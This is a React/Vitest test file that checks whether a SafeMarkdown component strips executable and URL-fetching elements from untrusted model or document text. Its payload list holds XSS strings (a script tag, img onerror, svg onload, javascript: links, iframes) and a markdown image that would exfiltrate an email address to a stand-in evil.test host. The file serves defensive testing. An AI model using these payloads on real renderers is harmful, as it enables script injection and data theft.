import { render } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { SafeMarkdown } from "./SafeMarkdown";

const PAYLOADS = [
  "<script>window.__pwned = true; alert(1)</script>",
  '<img src="x" onerror="window.__pwned = true">',
  "![exfil](https://evil.test/collect?d=amelia.thornbury@example.com)",
  "[click me](javascript:window.__pwned=true)",
  '<a href="https://evil.test">html link</a>',
  '<iframe src="https://evil.test"></iframe>',
  "<svg onload=\"window.__pwned=true\"></svg>",
  "[ref]: javascript:alert(1)\n\n[ref link][ref]",
];

describe("SafeMarkdown with malicious model/document text", () => {
  it.each(PAYLOADS)("renders %s without executable or fetching elements", (payload) => {
    const alertSpy = vi.spyOn(window, "alert").mockImplementation(() => {});
    const { container } = render(<SafeMarkdown text={`Hello **world**\n\n${payload}`} />);

    for (const tag of ["script", "img", "a", "iframe", "svg", "object", "embed"]) {
      expect(container.querySelector(tag)).toBeNull();
    }
    expect(container.querySelector("[onerror],[onload],[href],[src]")).toBeNull();
    expect((window as unknown as { __pwned?: boolean }).__pwned).toBeUndefined();
    expect(alertSpy).not.toHaveBeenCalled();
    expect(container.querySelector("strong")).toHaveTextContent("world");
  });

  it("keeps link and image text visible as plain text, not as fetchable URLs", () => {
    const { container } = render(<SafeMarkdown text={"[docs](https://example.com) and ![alt text](https://evil.test/x.png)"} />);
    expect(container).toHaveTextContent("docs");
    expect(container.innerHTML).not.toContain("https://evil.test");
  });
});
